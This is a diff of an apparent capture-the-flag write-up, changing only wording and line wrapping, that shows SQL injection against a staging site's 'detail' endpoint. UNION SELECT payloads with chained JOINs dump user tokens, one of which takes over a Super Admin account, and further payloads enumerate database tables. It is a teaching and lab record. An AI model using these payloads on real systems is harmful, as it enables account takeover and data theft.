@@ -311,7 +311,7 @@ the [MySQL github page](https://github.com/mysqljs/mysql#escaping-query-values) 
 To trigger this vulnerability, we simply need to make a request to the `detail` endpoint with more than one `id`, and we
 will perform our injection on one of the provided ids.
 
-Here's a simple example query which will return all entries with an id value less than 10:
+Here's a simple example query which will return all entries with an id value less than or equal to 10:
 
 ```
 https://staging.jackfrosttower.com/detail/1,2 OR id<=10
@@ -323,8 +323,8 @@ Let's take this to the next level and see if we can pull the users table:
 https://staging.jackfrosttower.com/detail/1,2 UNION SELECT * FROM users--
 ```
 
-This injection will union the `users` table with the `uniquecontact` information the form is supposed to pull back. Here's
-the result:
+This injection will union the `users` table with the `uniquecontact` information the form is supposed to pull back.
+Here's the result:
 
 ![Successful SQLi](SQLi.png)
 
@@ -349,23 +349,26 @@ We can leverage `JOIN` statements to help with this:
 https://staging.jackfrosttower.com/detail/1,2 UNION SELECT * FROM (select id from users)a JOIN (select name from users)b JOIN (select email from users)c JOIN (select token from users)d JOIN (select user_status from users)e JOIN (select date_created from users)f JOIN (select date_created from users)g--
 ```
 
-Take note that we are asking for `date_created` twice to conform to the schema of the `uniquecontacts` table.  
+Take note that we are asking for `date_created` twice to conform to the schema of the `uniquecontacts` table.
 
 Submitting this query after we submit a password reset yields a welcome sight:
 
 ![Super Admin Token](token.png)
 
-We can see our token - we simply need to grab that and head to the `/forgotpass/token/:id` endpoint and we can now login as `Super Admin`:
+We can see our token - we simply need to grab that and head to the `/forgotpass/token/:id` endpoint and we can now login
+as `Super Admin`:
 
 ![Super Admin](superadmin.png)
 
-After a bit more experimentation, however, it doesn't appear that gaining access to this account gives us much towards our goal of finding the todo list.  Let's see if we can enumerate some more information about the database.  We can alter our query to display some metadata about the MySQL databse from the `information_schema` database:
+After a bit more experimentation, however, it doesn't appear that gaining access to this account gives us much towards
+our goal of finding the todo list. Let's see if we can enumerate some more information about the database. We can alter
+our query to display some metadata about the MySQL databse from the `information_schema` database:
 
 ```
 http://staging.jackfrosttower.com/detail/1,2 UNION SELECT * FROM (select null from users)a JOIN (select table_name from information_schema.tables)b JOIN (select null from users)c JOIN (select null from users)d JOIN (select null from users)e JOIN (select null from users)f JOIN (select null from users)g--
 ```
 
-This query will pull back all table names from all databases.  After a bit of scrolling, we stumble on this:
+This query will pull back all table names from all databases. After a bit of scrolling, we stumble on this:
 
 ![Todo](todo.png)
 
